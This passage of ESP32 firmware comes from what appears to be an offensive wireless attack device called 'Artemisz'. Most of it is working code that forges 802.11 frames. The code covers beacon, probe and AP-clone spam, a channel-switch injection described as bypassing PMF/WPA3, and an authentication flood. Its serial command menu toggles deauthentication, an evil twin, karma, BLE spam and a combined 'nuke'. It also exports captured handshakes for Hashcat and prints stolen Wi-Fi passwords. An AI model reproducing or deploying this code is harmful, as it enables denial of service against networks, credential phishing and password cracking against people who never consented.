  for (int burst = 0; burst < 10; burst++) {
    // Random source MAC
    for (int j = 0; j < 6; j++) probe[10 + j] = random(256);
    probe[10] &= 0xFE; // Unicast

    // Random sequence
    uint16_t seq = (random(0xFFF) << 4);
    probe[22] = seq & 0xFF; probe[23] = (seq >> 8) & 0xFF;

    int offset = 24;
    // Random SSID
    int ssidLen = random(4, 17);
    probe[offset++] = 0x00; probe[offset++] = ssidLen;
    for (int i = 0; i < ssidLen; i++) probe[offset++] = 'a' + random(26);

    // Supported rates
    probe[offset++] = 0x01; probe[offset++] = 0x04;
    probe[offset++] = 0x82; probe[offset++] = 0x84;
    probe[offset++] = 0x8B; probe[offset++] = 0x96;

    esp_wifi_80211_tx(WIFI_IF_AP, probe, offset, false);
  }
}

// ========== Random Beacon Spam ==========
void sendRandomBeacon() {
  char ssid[21];
  int len = random(5, 20);
  for (int i = 0; i < len; i++) {
    int r = random(36);
    ssid[i] = (r < 26) ? ('A' + r) : ('0' + (r - 26));
  }
  ssid[len] = '\0';
  sendKarmaBeacon(ssid);
}

// ========== AP Clone Spam ==========
void sendAPCloneBeacon() {
  if (_selectedNetwork.ssid.length() == 0) return;
  const char* ssid = _selectedNetwork.ssid.c_str();
  int ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;

  // Build template frame once, then vary BSSID per clone
  uint8_t beacon[128];
  memset(beacon, 0, sizeof(beacon));
  beacon[0] = 0x80; beacon[1] = 0x00;
  memset(beacon + 4, 0xFF, 6);

  uint64_t ts = (uint64_t)micros();
  memcpy(beacon + 24, &ts, 8);
  beacon[32] = 0x64; beacon[33] = 0x00;
  beacon[34] = 0x31; beacon[35] = 0x04;

  int offset = 36;
  beacon[offset++] = 0x00; beacon[offset++] = (uint8_t)ssidLen;
  memcpy(beacon + offset, ssid, ssidLen); offset += ssidLen;
  beacon[offset++] = 0x01; beacon[offset++] = 0x08;
  memcpy(beacon + offset, _defaultRates, 8); offset += 8;
  beacon[offset++] = 0x03; beacon[offset++] = 0x01;
  beacon[offset++] = _selectedNetwork.ch;

  for (int i = 0; i < 10; i++) {
    uint8_t fakeMAC[6];
    for (int j = 0; j < 6; j++) fakeMAC[j] = random(256);
    fakeMAC[0] &= 0xFE;
    memcpy(beacon + 10, fakeMAC, 6);
    memcpy(beacon + 16, fakeMAC, 6);
    // Update timestamp per frame
    ts = (uint64_t)micros();
    memcpy(beacon + 24, &ts, 8);
    esp_wifi_80211_tx(WIFI_IF_AP, beacon, offset, false);
  }
}

// ========== Rick Roll Beacon ==========
void sendRickRollBeacons() {
  for (int i = 0; i < RICKROLL_COUNT; i++) {
    sendKarmaBeacon(_rickRollSSIDs[i]);
  }
}

// ========== CSA Attack (Channel Switch Announcement) ==========
// Bypasses PMF/WPA3: Injects forged beacon with CSA IE telling clients
// to switch to a wrong channel. Clients obey because beacons aren't
// individually authenticated under 802.11w.
void sendCSABeacon() {
  if (_selectedNetwork.ssid.length() == 0) return;
  const char* ssid = _selectedNetwork.ssid.c_str();
  int ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;

  uint8_t beacon[128];
  memset(beacon, 0, sizeof(beacon));
  beacon[0] = 0x80; beacon[1] = 0x00;  // Beacon
  memset(beacon + 4, 0xFF, 6);          // DA: broadcast
  memcpy(beacon + 10, _selectedNetwork.bssid, 6); // SA = real AP BSSID
  memcpy(beacon + 16, _selectedNetwork.bssid, 6); // BSSID = real AP BSSID

  static uint16_t csaSeq = 0;
  uint64_t ts = (uint64_t)micros();
  memcpy(beacon + 24, &ts, 8);
  beacon[32] = 0x64; beacon[33] = 0x00;  // Beacon interval 100 TU
  beacon[34] = 0x31; beacon[35] = 0x04;  // Capability: ESS + Privacy

  int offset = 36;
  // SSID IE
  beacon[offset++] = 0x00;
  beacon[offset++] = (uint8_t)ssidLen;
  memcpy(beacon + offset, ssid, ssidLen); offset += ssidLen;
  // Supported Rates
  beacon[offset++] = 0x01; beacon[offset++] = 0x08;
  memcpy(beacon + offset, _defaultRates, 8); offset += 8;
  // DS Parameter Set (AP's real channel)
  beacon[offset++] = 0x03; beacon[offset++] = 0x01;
  beacon[offset++] = _selectedNetwork.ch;
  // CSA IE — the PMF bypass payload
  // Mode=1 (stop TX), NewChannel=target, Count=2 (switch in 2 beacons)
  beacon[offset++] = 0x25; // Element ID: Channel Switch Announcement
  beacon[offset++] = 0x03;
  beacon[offset++] = 0x01; // Mode: prohibit transmission until switch
  beacon[offset++] = _csaTargetCh;
  beacon[offset++] = 0x02; // Count: switch after 2 beacons (aggressive)

  for (int i = 0; i < 5; i++) {
    ts = (uint64_t)micros();
    memcpy(beacon + 24, &ts, 8);
    csaSeq = (csaSeq + 1) & 0xFFF;
    uint16_t seqCtl = csaSeq << 4;
    beacon[22] = seqCtl & 0xFF;
    beacon[23] = (seqCtl >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_AP, beacon, offset, false);
  }
}

// ========== Auth Flood ==========
// Sends mass authentication requests with random MACs to exhaust
// AP's client table. When full, legitimate clients can't associate.
void sendAuthFlood() {
  if (_selectedNetwork.ssid.length() == 0) return;
  uint8_t authFrame[30];
  memset(authFrame, 0, sizeof(authFrame));
  authFrame[0] = 0xB0; authFrame[1] = 0x00;  // Authentication
  memcpy(authFrame + 4, _selectedNetwork.bssid, 6);  // DA = AP
  memcpy(authFrame + 16, _selectedNetwork.bssid, 6); // BSSID = AP
  // Open System auth, seq 1, status 0
  authFrame[24] = 0x00; authFrame[25] = 0x00;
  authFrame[26] = 0x01; authFrame[27] = 0x00;
  authFrame[28] = 0x00; authFrame[29] = 0x00;

  static uint16_t authSeq = 0;
  for (int i = 0; i < 20; i++) {
    for (int j = 0; j < 6; j++) authFrame[10 + j] = random(256);
    authFrame[10] = (authFrame[10] & 0xFE) | 0x02; // Unicast + locally administered
    authSeq = (authSeq + 1) & 0xFFF;
    uint16_t seqCtl = authSeq << 4;
    authFrame[22] = seqCtl & 0xFF;
    authFrame[23] = (seqCtl >> 8) & 0xFF;
    esp_wifi_80211_tx(WIFI_IF_AP, authFrame, sizeof(authFrame), false);
  }
}

// ========== HCCAPX Export (Hashcat) ==========
void handleHccapxDownload() {
  if (!isAuthenticated()) return;

  int readyCount = 0;
  for (int i = 0; i < _handshakeCount; i++)
    if ((_handshakes[i].msgMask & 0x03) == 0x03) readyCount++;

  if (readyCount == 0) {
    webServer.send(200, "text/plain", "No complete handshakes for HCCAPX export.");
    return;
  }

  WiFiClient client = webServer.client();
  int totalSize = readyCount * artemisz::HCCAPX_RECORD_LEN;

  client.println("HTTP/1.1 200 OK");
  client.println("Content-Type: application/octet-stream");
  client.println("Content-Disposition: attachment; filename=handshakes.hccapx");
  client.print("Content-Length: "); client.println(totalSize);
  client.println("Connection: close");
  client.println();

  for (int i = 0; i < _handshakeCount; i++) {
    if ((_handshakes[i].msgMask & 0x03) != 0x03) continue;

    // Derive SNonce / MIC / keyver / EAPOL from the stored msg2 frame using the
    // tested artemisz_core parser. Zero fallbacks mirror the previous behaviour
    // when msg2 is too short to hold the EAPOL-Key fields.
    const uint8_t* m2 = _handshakes[i].pkts[1].data;
    uint16_t m2Len = _handshakes[i].pkts[1].len;
    uint8_t snonce[32]; memset(snonce, 0, sizeof(snonce));
    uint8_t mic[16];    memset(mic, 0, sizeof(mic));
    uint8_t keyver = 0;
    const uint8_t* eapol = m2;  // valid non-null fallback (eapolLen stays 0)
    int eapolLen = 0;

    int m2Hdr = artemisz::dataHeaderLen(m2[0]);
    int m2Eapol = artemisz::eapolOffsetIn80211(m2, m2Len, m2Hdr);
    if (m2Eapol >= 0) {
      const uint8_t* e2 = m2 + m2Eapol;
      int e2Avail = (int)m2Len - m2Eapol;
      if (e2Avail > 99) {  // matches the old `m2Len > m2Eapol + 99` guard
        keyver = artemisz::eapolKeyVersion(e2, e2Avail);
        artemisz::eapolKeyMic(e2, e2Avail, mic);
        artemisz::eapolKeyNonce(e2, e2Avail, snonce);
        eapol = e2;
        eapolLen = e2Avail;
      }
    }

    artemisz::HccapxInput in;
    in.essid = _selectedNetwork.ssid.c_str();
    in.essidLen = _selectedNetwork.ssid.length();
    in.macAp = _handshakes[i].bssid;
    in.macSta = _handshakes[i].client;
    in.anonce = _handshakes[i].anonce;
    in.snonce = snonce;
    in.keyver = keyver;
    in.mic = mic;
    in.eapol = eapol;
    in.eapolLen = eapolLen;
    in.messagePair = 0;  // M1 + M2

    uint8_t rec[artemisz::HCCAPX_RECORD_LEN];
    artemisz::buildHccapxRecord(rec, in);
    client.write(rec, artemisz::HCCAPX_RECORD_LEN);
  }
}

// ========== Signal Monitor (TFT RSSI Graph) ==========
void drawSignalMonitor() {
  if (_selectedNetwork.ssid.length() == 0) return;

  int graphX = 0, graphY = 16, graphW = 170, graphH = 250;

  if (!_sigMonHeaderDrawn) {
    tft.fillScreen(TFT_BLACK);
    tft.setTextSize(1);
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setCursor(0, 0);
    tft.print("Sig: ");
    const char* raw = _selectedNetwork.ssid.c_str();
    int rLen = _selectedNetwork.ssid.length();
    char buf[20];
    if (rLen > 16) { memcpy(buf, raw, 16); buf[16]='.'; buf[17]='.'; buf[18]='\0'; tft.print(buf); }
    else tft.print(raw);
    tft.print(" Ch:");
    tft.println(_selectedNetwork.ch);

    // Grid lines (drawn once)
    for (int db = -30; db >= -100; db -= 10) {
      int y = graphY + map(db, -30, -100, 0, graphH);
      tft.drawFastHLine(graphX, y, graphW, tft.color565(20, 20, 30));
      tft.setCursor(0, y - 3);
      tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
      tft.print(db);
    }

    // Footer (drawn once)
    tft.fillRect(0, tft.height() - 14, tft.width(), 14, TFT_NAVY);
    tft.setTextColor(TFT_WHITE, TFT_NAVY);
    tft.setCursor(5, tft.height() - 12);
    tft.print("CLI: sigmon to exit");

    _sigMonHeaderDrawn = true;
  }

  // Clear only the graph area + RSSI readout (not header/grid labels/footer)
  tft.fillRect(graphX + 22, graphY, graphW - 22, graphH, TFT_BLACK);

  // Redraw grid lines inside cleared area
  for (int db = -30; db >= -100; db -= 10) {
    int y = graphY + map(db, -30, -100, 0, graphH);
    tft.drawFastHLine(graphX + 22, y, graphW - 22, tft.color565(20, 20, 30));
  }

  // Draw RSSI line graph
  for (int i = 1; i < SIG_MON_WIDTH; i++) {
    int idx1 = (_rssiHistIdx + i - 1) % SIG_MON_WIDTH;
    int idx2 = (_rssiHistIdx + i) % SIG_MON_WIDTH;
    if (_rssiHistory[idx1] == 0 && _rssiHistory[idx2] == 0) continue;

    int y1 = graphY + map(constrain(_rssiHistory[idx1], -100, -30), -30, -100, 0, graphH);
    int y2 = graphY + map(constrain(_rssiHistory[idx2], -100, -30), -30, -100, 0, graphH);

    uint16_t color;
    if (_rssiHistory[idx2] > -50) color = TFT_GREEN;
    else if (_rssiHistory[idx2] > -70) color = TFT_YELLOW;
    else color = TFT_RED;

    tft.drawLine(i - 1 + 22, y1, i + 22, y2, color);
  }

  // Current value (clear + redraw in place)
  tft.fillRect(0, graphY + graphH + 2, graphW, 20, TFT_BLACK);
  int8_t cur = _rssiHistory[(_rssiHistIdx - 1 + SIG_MON_WIDTH) % SIG_MON_WIDTH];
  tft.setCursor(0, graphY + graphH + 4);
  tft.setTextSize(2);
  if (cur > -50) tft.setTextColor(TFT_GREEN, TFT_BLACK);
  else if (cur > -70) tft.setTextColor(TFT_YELLOW, TFT_BLACK);
  else tft.setTextColor(TFT_RED, TFT_BLACK);
  tft.print(cur);
  tft.setTextSize(1);
  tft.print(" dBm  ");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
}

// ========== Serial CLI ==========
void handleSerialCLI() {
  while (Serial.available()) {
    char c = Serial.read();
    if (c == '\n' || c == '\r') {
      if (_serialBuffer.length() > 0) {
        _serialBuffer.trim();
        String cmd = _serialBuffer;
        _serialBuffer = "";

        if (cmd == "help") {
          Serial.println(F("=== Artemisz CLI ==="));
          Serial.println(F("scan          Rescan networks"));
          Serial.println(F("list          List networks"));
          Serial.println(F("select <n>    Select network by index"));
          Serial.println(F("deauth        Toggle deauth"));
          Serial.println(F("deauthall     Toggle deauth-all"));
          Serial.println(F("csa           Toggle CSA attack (PMF bypass)"));
          Serial.println(F("authflood     Toggle auth flood"));
          Serial.println(F("nuke          Toggle NUKE (deauth+CSA+authflood)"));
          Serial.println(F("eviltwin      Toggle evil twin"));
          Serial.println(F("karma         Toggle karma"));
          Serial.println(F("beacon        Toggle beacon spam"));
          Serial.println(F("rbeacon       Toggle random beacon"));
          Serial.println(F("rickroll      Toggle rick roll beacon"));
          Serial.println(F("apclone       Toggle AP clone spam"));
          Serial.println(F("probeflood    Toggle probe flood"));
          Serial.println(F("blespam <n>   BLE spam (0=Apple 1=MS 2=Samsung)"));
          Serial.println(F("blestop       Stop BLE spam"));
          Serial.println(F("detect        Toggle deauth detection"));
          Serial.println(F("sigmon        Toggle signal monitor"));
          Serial.println(F("creds         Show credentials"));
          Serial.println(F("pmkid         Show PMKIDs"));
          Serial.println(F("status        Show system status"));
          Serial.println(F("clearcreds    Clear credentials"));
          Serial.println(F("clearhs       Clear handshakes"));
          Serial.println(F("clearpmkid    Clear PMKIDs"));
        }
        else if (cmd == "scan") {
          Serial.println("[*] Scanning...");
          performScan();
          int cnt = 0;
          for (int i = 0; i < MAX_NETWORKS; i++) if (_networks[i].ssid != "") cnt++;
          Serial.printf("[*] Found %d networks\n", cnt);
          if (!signalMonitorActive && !showingCreds) updateDisplay();
        }
        else if (cmd == "list") {
          for (int i = 0; i < MAX_NETWORKS; i++) {
            if (_networks[i].ssid == "") break;
            Serial.printf("[%d] %s (Ch:%d RSSI:%d %s)\n", i,
              _networks[i].ssid.c_str(), _networks[i].ch, _networks[i].rssi,
              bytesToStr(_networks[i].bssid, 6).c_str());
          }
        }
        else if (cmd.startsWith("select ")) {
          int idx = cmd.substring(7).toInt();
          int cnt = 0;
          for (int i = 0; i < MAX_NETWORKS; i++) if (_networks[i].ssid != "") cnt++;
          if (idx >= 0 && idx < cnt) {
            _selectedNetwork = _networks[idx];
            currentTargetIndex = idx;
            clearClients();
            Serial.printf("[+] Selected: %s\n", _selectedNetwork.ssid.c_str());
            if (!signalMonitorActive && !showingCreds) updateDisplay();
          } else Serial.println("[-] Invalid index");
        }
        else if (cmd == "deauth") {
          deauthing_active = !deauthing_active; deauthAllActive = false;
          if (deauthing_active && !hotspot_active) syncAPChannel();
          Serial.printf("[*] Deauth: %s\n", deauthing_active ? "ON" : "OFF");
          if (!signalMonitorActive && !showingCreds) updateDisplay();
        }
        else if (cmd == "deauthall") {
          deauthAllActive = !deauthAllActive; deauthing_active = false;
          if (deauthAllActive && !hotspot_active) syncAPChannel();
          Serial.printf("[*] Deauth All: %s\n", deauthAllActive ? "ON" : "OFF");
          if (!signalMonitorActive && !showingCreds) updateDisplay();
        }
        else if (cmd == "csa") {
          csaAttackActive = !csaAttackActive;
          if (csaAttackActive && _selectedNetwork.ssid.length() > 0) {
            do { _csaTargetCh = random(1, 14); } while (_csaTargetCh == _selectedNetwork.ch);
            if (!hotspot_active) syncAPChannel();
            Serial.printf("[*] CSA Attack: ON (target -> ch %d)\n", _csaTargetCh);
          } else {
            csaAttackActive = false;
            Serial.println("[*] CSA Attack: OFF");
          }
        }
        else if (cmd == "authflood") {
          authFloodActive = !authFloodActive;
          if (authFloodActive && _selectedNetwork.ssid.length() > 0) {
            if (!hotspot_active) syncAPChannel();
          } else authFloodActive = false;
          Serial.printf("[*] Auth Flood: %s\n", authFloodActive ? "ON" : "OFF");
        }
        else if (cmd == "nuke") {
          nukeActive = !nukeActive;
          if (nukeActive && _selectedNetwork.ssid.length() > 0) {
            deauthing_active = true; csaAttackActive = true; authFloodActive = true;
            deauthAllActive = false;
            do { _csaTargetCh = random(1, 14); } while (_csaTargetCh == _selectedNetwork.ch);
            if (!hotspot_active) syncAPChannel();
            Serial.printf("[*] NUKE: ON (deauth+CSA ch%d+authflood)\n", _csaTargetCh);
          } else {
            nukeActive = false; deauthing_active = false; csaAttackActive = false; authFloodActive = false;
            Serial.println("[*] NUKE: OFF");
          }
          if (!signalMonitorActive && !showingCreds) updateDisplay();
        }
        else if (cmd == "eviltwin") {
          hotspot_active = !hotspot_active;
          if (hotspot_active && _selectedNetwork.ssid != "") {
            deauthing_active = true;
            _etGraceUntil = millis() + 5000;
            _lastStationCount = 0;
            switchAPConfig(_selectedNetwork.ssid.c_str(), NULL, _selectedNetwork.ch);
          } else if (!hotspot_active) {
            switchAPConfig("Artemisz", "Eviltwin", 1);
          }
          Serial.printf("[*] Evil Twin: %s\n", hotspot_active ? "ON" : "OFF");
          if (!signalMonitorActive && !showingCreds) updateDisplay();
        }
        else if (cmd == "karma") {
          karmaActive = !karmaActive;
          Serial.printf("[*] Karma: %s\n", karmaActive ? "ON" : "OFF");
        }
        else if (cmd == "beacon") {
          beaconSpamActive = !beaconSpamActive;
          Serial.printf("[*] Beacon Spam: %s\n", beaconSpamActive ? "ON" : "OFF");
        }
        else if (cmd == "rbeacon") {
          randomBeaconActive = !randomBeaconActive;
          Serial.printf("[*] Random Beacon: %s\n", randomBeaconActive ? "ON" : "OFF");
        }
        else if (cmd == "rickroll") {
          rickRollActive = !rickRollActive;
          Serial.printf("[*] Rick Roll: %s\n", rickRollActive ? "ON" : "OFF");
        }
        else if (cmd == "apclone") {
          apCloneSpamActive = !apCloneSpamActive;
          Serial.printf("[*] AP Clone: %s\n", apCloneSpamActive ? "ON" : "OFF");
        }
        else if (cmd == "probeflood") {
          probeFloodActive = !probeFloodActive;
          Serial.printf("[*] Probe Flood: %s\n", probeFloodActive ? "ON" : "OFF");
        }
        else if (cmd.startsWith("blespam")) {
          int type = 0;
          if (cmd.length() > 8) type = cmd.substring(8).toInt();
          bleSpamType = constrain(type, 0, 2);
          bleSpamActive = true;
          const char* names[] = {"Sour Apple (iOS)", "Swiftpair (Windows)", "Samsung Galaxy"};
          Serial.printf("[*] BLE Spam: %s\n", names[bleSpamType]);
        }
        else if (cmd == "blestop") {
          bleSpamActive = false; stopBLE();
          Serial.println("[*] BLE Spam stopped");
        }
        else if (cmd == "detect") {
          deauthDetectActive = !deauthDetectActive; _deauthDetected = 0;
          Serial.printf("[*] Deauth Detect: %s\n", deauthDetectActive ? "ON" : "OFF");
        }
        else if (cmd == "sigmon") {
          signalMonitorActive = !signalMonitorActive;
          if (signalMonitorActive) {
            memset(_rssiHistory, 0, sizeof(_rssiHistory));
            _rssiHistIdx = 0;
            _sigMonHeaderDrawn = false;
            Serial.println("[*] Signal Monitor: ON");
          } else {
            updateDisplay();
            Serial.println("[*] Signal Monitor: OFF");
          }
        }
        else if (cmd == "creds") {
          Serial.printf("[*] %d credentials:\n", _credCount);
          for (int i = 0; i < _credCount; i++)
            Serial.printf("  [%d] %s -> %s [%s]\n", i, _credLog[i].ssid.c_str(),
              _credLog[i].password.c_str(), _credLog[i].verified ? "VERIFIED" : "FAILED");
        }
        else if (cmd == "pmkid") {
          Serial.printf("[*] %d PMKIDs:\n", _pmkidCount);
          for (int i = 0; i < _pmkidCount; i++) {
            Serial.printf("  [%d] AP:%s STA:%s PMKID:", i,
              bytesToStr(_pmkids[i].bssid, 6).c_str(),
              bytesToStr(_pmkids[i].client, 6).c_str());
            for (int j = 0; j < 16; j++) Serial.printf("%02x", _pmkids[i].pmkid[j]);
            Serial.println();
          }
        }
        else if (cmd == "status") {
          Serial.println(F("=== Artemisz Status ==="));
          Serial.printf("Target: %s (Ch:%d)\n",
            _selectedNetwork.ssid.length() ? _selectedNetwork.ssid.c_str() : "None",
            _selectedNetwork.ch);
          Serial.printf("Deauth: %s | Evil Twin: %s | Karma: %s (%d probes)\n",
            deauthing_active ? "ON" : (deauthAllActive ? "ALL" : "OFF"),
            hotspot_active ? "ON" : "OFF", karmaActive ? "ON" : "OFF", _probeCount);
          Serial.printf("CSA: %s | AuthFlood: %s | Nuke: %s\n",
            csaAttackActive ? "ON" : "OFF", authFloodActive ? "ON" : "OFF",
            nukeActive ? "ON" : "OFF");
          Serial.printf("Beacon: %s | RndBeacon: %s | RickRoll: %s | APClone: %s\n",
            beaconSpamActive ? "ON" : "OFF", randomBeaconActive ? "ON" : "OFF",
            rickRollActive ? "ON" : "OFF", apCloneSpamActive ? "ON" : "OFF");
          Serial.printf("ProbeFlood: %s | BLE: %s | DeauthDetect: %s (%u)\n",
            probeFloodActive ? "ON" : "OFF", bleSpamActive ? "ON" : "OFF",
            deauthDetectActive ? "ON" : "OFF", _deauthDetected);
          Serial.printf("HS: %d | PMKID: %d | Creds: %d | Clients: %d\n",
            _handshakeCount, _pmkidCount, _credCount, _clientCount);
          Serial.printf("Heap: %u | Uptime: %lus\n", ESP.getFreeHeap(), millis() / 1000);
        }
        else if (cmd == "clearcreds") {
          _credCount = 0;
          preferences.begin("art-creds", false); preferences.clear(); preferences.end();
          Serial.println("[*] Credentials cleared");
        }
        else if (cmd == "clearhs") {
          _handshakeCount = 0; memset(_handshakes, 0, sizeof(_handshakes));
          Serial.println("[*] Handshakes cleared");
        }
        else if (cmd == "clearpmkid") {
          _pmkidCount = 0; memset(_pmkids, 0, sizeof(_pmkids));
          Serial.println("[*] PMKIDs cleared");
        }
        else {
          Serial.println("[-] Unknown command. Type 'help'");
        }
      }
    } else {
      _serialBuffer += c;
    }
  }
}

// Update the updateDisplay function to only show the main screen
void updateDisplay() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  
  // Header with consistent text size
  tft.setTextSize(1);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  
  // Show uptime and network count with consistent formatting
  int attackTime = millis() / 1000;
  tft.print("Uptime: ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print(attackTime / 60);
  tft.print("m ");
  tft.print(attackTime % 60);
  tft.print("s");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.print(" | ");
  
  // Count networks
  int networkCount = 0;
  for (int i = 0; i < MAX_NETWORKS; i++) {
    if (_networks[i].ssid != "") networkCount++;
  }
  tft.print("Networks: ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print(String(networkCount));
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.print(" | Clients: ");
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.println(String(_clientCount));
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  
  // Target info with consistent formatting
  if (_selectedNetwork.ssid != "") {
    tft.print("Target: ");
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.println(_selectedNetwork.ssid);
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.print("Channel: ");
    tft.print(String(_selectedNetwork.ch));
    tft.print(" | BSSID: ");
    tft.println(bytesToStr(_selectedNetwork.bssid, 6));
  } else {
    tft.println("No target selected");
  }
  
  // Attack status with reversed color logic (RED for OFF, GREEN for ON)
  tft.print("Deauth: ");
  if (deauthAllActive) {
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.print("ALL");
  } else if (deauthing_active) {
    // Active attack = GREEN
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.print("ACTIVE");
  } else {
    // Inactive attack = RED
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.print("OFF");
  }
  
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.print(" | Evil Twin: ");
  if (hotspot_active) {
    // Active attack = GREEN
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.println("ACTIVE");
  } else {
    // Inactive attack = RED
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.println("OFF");
  }
  
  // Karma + Handshake status line
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.print("Karma: ");
  if (karmaActive) {
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.print("ON");
  } else {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.print("OFF");
  }
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.print(" P:");
  tft.setTextColor(TFT_CYAN, TFT_BLACK);
  tft.print(String(_probeCount));
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.print(" | HS:");
  int hsReady = 0;
  for (int i = 0; i < _handshakeCount; i++)
    if ((_handshakes[i].msgMask & 0x03) == 0x03) hsReady++;
  if (hsReady > 0) {
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
  } else {
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
  }
  tft.print(String(hsReady));
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.print("/");
  tft.println(String(_handshakeCount));

  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.print("Spam: ");
  if (beaconSpamActive) { tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.print("ON"); }
  else { tft.setTextColor(TFT_RED, TFT_BLACK); tft.print("OFF"); }
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.print(" | PMKID:");
  tft.setTextColor(_pmkidCount > 0 ? TFT_GREEN : TFT_CYAN, TFT_BLACK);
  tft.print(_pmkidCount);
  if (bleSpamActive) {
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.print(" BLE:");
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    const char* bt[] = {"APL","MS","SAM"};
    tft.print(bt[bleSpamType]);
  }
  tft.println();
  if (deauthDetectActive) {
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.print("Detect: ");
    if (_deauthDetected > 0) {
      tft.setTextColor(TFT_RED, TFT_BLACK);
      tft.print(_deauthDetected);
      tft.print(" DEAUTH!");
    } else {
      tft.setTextColor(TFT_GREEN, TFT_BLACK);
      tft.print("Clear");
    }
    tft.println();
  }

  // Captured password with consistent formatting
  if (_credCount > 0) {
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.print("Creds: ");
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.print(String(_credCount));
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
    tft.print(" | Last: ");
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.println(_credLog[_credCount-1].password);
  }
  
  // Divider
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.println("----------------");
  
  // Show all available networks
  tft.println("Available Networks:");
  
  // Display all networks that fit on screen
  for (int i = 0; i < networkCount; i++) {
    if (_networks[i].ssid == "") break;
    // Highlight if this is the selected network — compare raw BSSID bytes instead of String
    bool isSelected = (_selectedNetwork.ssid == _networks[i].ssid &&
        memcmp(_selectedNetwork.bssid, _networks[i].bssid, 6) == 0);
    if (isSelected) {
      tft.setTextColor(TFT_BLACK, TFT_GREEN);
    } else {
      tft.setTextColor(TFT_WHITE, TFT_BLACK);
    }
    
    // Show network with SSID, channel, and signal strength
    tft.print(i+1);
    if (i < 9) tft.print(" "); // Align single digits
    tft.print(". ");
    // Truncate long SSIDs — use c_str() + char buffer to avoid String alloc
    const char* rawSsid = _networks[i].ssid.c_str();
    int rawLen = _networks[i].ssid.length();
    char truncBuf[16];
    if (rawLen > 12) {
      memcpy(truncBuf, rawSsid, 12);
      truncBuf[12] = '.'; truncBuf[13] = '.'; truncBuf[14] = '\0';
      tft.print(truncBuf);
    } else {
      tft.print(rawSsid);
    }
    tft.print(" ");
    tft.print(_networks[i].ch);
    tft.print("ch ");
    // Color-coded RSSI
    int rssi = _networks[i].rssi;
    uint16_t savedBg = isSelected ? TFT_GREEN : TFT_BLACK;
    if (rssi > -50) tft.setTextColor(TFT_GREEN, savedBg);
    else if (rssi > -70) tft.setTextColor(TFT_YELLOW, savedBg);
    else tft.setTextColor(TFT_RED, savedBg);
    tft.print(rssi);
    tft.println("dBm");
  }
  
  // Create a more visible button instruction area with better organization
  // Draw a background bar
  tft.fillRect(0, tft.height() - 40, tft.width(), 40, TFT_NAVY);

  // Set text properties
  tft.setTextSize(1);

  // Draw a header line
  tft.setTextColor(TFT_CYAN, TFT_NAVY);
  tft.setCursor(5, tft.height() - 38);
  tft.print("CONTROLS:");

  // Row 1: buttons 1-3
  int btnY = tft.height() - 26;

  tft.setTextColor(TFT_WHITE, TFT_NAVY);
  tft.setCursor(5, btnY);
  tft.print("1:");
  tft.setTextColor(TFT_YELLOW, TFT_NAVY);
  tft.print("Up");

  tft.setTextColor(TFT_WHITE, TFT_NAVY);
  tft.setCursor(30, btnY);
  tft.print("2:");
  tft.setTextColor(TFT_YELLOW, TFT_NAVY);
  tft.print("Down");

  tft.setTextColor(TFT_WHITE, TFT_NAVY);
  tft.setCursor(65, btnY);
  tft.print("3:");
  tft.setTextColor(TFT_YELLOW, TFT_NAVY);
  tft.print("Deauth");

  // Row 2: buttons 4-5
  btnY = tft.height() - 14;

  tft.setTextColor(TFT_WHITE, TFT_NAVY);
  tft.setCursor(5, btnY);
  tft.print("4:");
  tft.setTextColor(TFT_YELLOW, TFT_NAVY);
  tft.print("Twin");

  tft.setTextColor(TFT_WHITE, TFT_NAVY);
  tft.setCursor(45, btnY);
  tft.print("5:");
  tft.setTextColor(TFT_GREEN, TFT_NAVY);
  tft.print("Creds");

  // Reset text color
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
}

// Display captured credentials on TFT screen
void displayCredentials() {
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(0, 0);
  tft.setTextSize(1);

  tft.setTextColor(TFT_GREEN, TFT_BLACK);
  tft.println("== SAVED CREDENTIALS ==");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  tft.println();

  if (_credCount == 0) {
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.println("No credentials captured yet.");
    tft.setTextColor(TFT_WHITE, TFT_BLACK);
  } else {
